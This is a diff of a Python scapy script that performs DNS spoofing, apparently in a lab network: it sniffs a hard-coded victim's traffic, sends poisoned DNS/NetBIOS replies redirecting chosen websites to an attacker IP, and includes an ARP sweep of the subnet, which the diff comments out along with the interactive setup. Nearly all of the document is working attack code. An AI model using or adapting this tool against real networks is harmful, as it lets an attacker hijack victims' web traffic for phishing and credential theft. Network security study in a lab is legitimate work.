@@ -5,10 +5,11 @@ from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse
 
 class Dns():
 
-    def __init__(self,networkInterface, victimIP, spoofedWebsites):
+    def __init__(self,networkInterface, victimIP, serverIP, spoofedWebsites):
         self.networkInterface = networkInterface
         self.victimIP = victimIP
         self.spoofedWebsites = spoofedWebsites
+        self.serverIP = serverIP
 
 
     def startSniffing(self):
@@ -32,8 +33,7 @@ class Dns():
                 sendp(poisonedPaket, verbose=0, iface=self.networkInterface)
 
     def start(self):
-        while(True):
-            self.startSniffing()
+        self.startSniffing()
 
 
 networkInterface = "enp0s3"
@@ -42,27 +42,27 @@ victimIP = "192.168.56.101"
 spoofedWebsites = {}
 
 #simple terminal interface
-print("Scanning the network .. ")
-ans, unans = srp (Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = "192.168.56.0/24"), timeout = 2, iface = networkInterface, inter = 0.1)
-for arg1, arg2 in ans :
-    print ("IP: {} MAC: {}".format(arg2[ARP].psrc, arg2[ARP].hwsrc))
+# print("Scanning the network .. ")
+# ans, unans = srp (Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = "192.168.56.0/24"), timeout = 2, iface = networkInterface, inter = 0.1)
+# for arg1, arg2 in ans :
+#     print ("IP: {} MAC: {}".format(arg2[ARP].psrc, arg2[ARP].hwsrc))
 
 
-print ("Start DNS spoof")
-redirectTo = raw_input("Enter the ip where or tool will redirect victim requests:")
-
-
-input = ""
-while input != "stop":
-    input = raw_input("Enter the URL to DNS spoof list or stop if you are done: ")
-    if input != "stop":
-        input = input.upper()
-        spoofedWebsites.update({input+"   " : redirectTo})
-        if input[0:4] != "WWW.":
-            spoofedWebsites.update({"WWW."+ input+"   ": redirectTo})
-        else:
-            spoofedWebsites.update({input[4:]+"   ": redirectTo})
-
-print(spoofedWebsites)
-test = Dns(networkInterface, victimIP, spoofedWebsites)
-test.start()
+# print ("Start DNS spoof")
+# redirectTo = "192.168.56.102"
+#
+#
+# input = ""
+# while input != "stop":
+#     input = raw_input("Enter the URL to DNS spoof list or stop if you are done: ")
+#     if input != "stop":
+#         input = input.upper()
+#         spoofedWebsites.update({input+"   " : redirectTo})
+#         if input[0:4] != "WWW.":
+#             spoofedWebsites.update({"WWW."+ input+"   ": redirectTo})
+#         else:
+#             spoofedWebsites.update({input[4:]+"   ": redirectTo})
+#
+# print(spoofedWebsites)
+# test = Dns(networkInterface, victimIP, spoofedWebsites)
+# test.start()
